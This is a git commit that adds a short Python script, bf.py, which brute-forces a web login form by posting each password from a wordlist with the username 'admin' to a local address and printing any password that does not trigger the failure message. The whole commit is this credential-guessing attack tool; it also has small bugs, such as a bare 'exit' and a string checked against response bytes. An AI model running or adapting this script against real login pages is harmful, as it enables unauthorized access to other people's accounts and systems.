7e95695cd6b22e6fb37af9b8746af37971ab6e7e
Adam713 <Adamalwan55@gmail.com>
2020-08-27 04:11:52 +0300

    first commit

---
+++ bf.py
@@ -0,0 +1,20 @@
+import requests
+def bruteforce(username,url):
+    for k in k1:
+        k = k.strip()
+        print ('[!!] trying to bruteforce password ' + k)
+        data_dictionary = {'name':username, 'password':k, 'Login':'return false'}
+        resp = requests.post(url, data_dictionary)
+        if "Authentication failed: invalid username or password." in resp.content:
+
+            pass
+        else:
+            print("[+] username is: " + username)
+            print("[+] pasword is: " + k)
+            exit
+
+url = 'http://10.0.0.1:8080/'
+username = 'admin'
+
+with open('/root/butrfourcpy/k1.txt','r') as k1:
+    bruteforce(username,url)
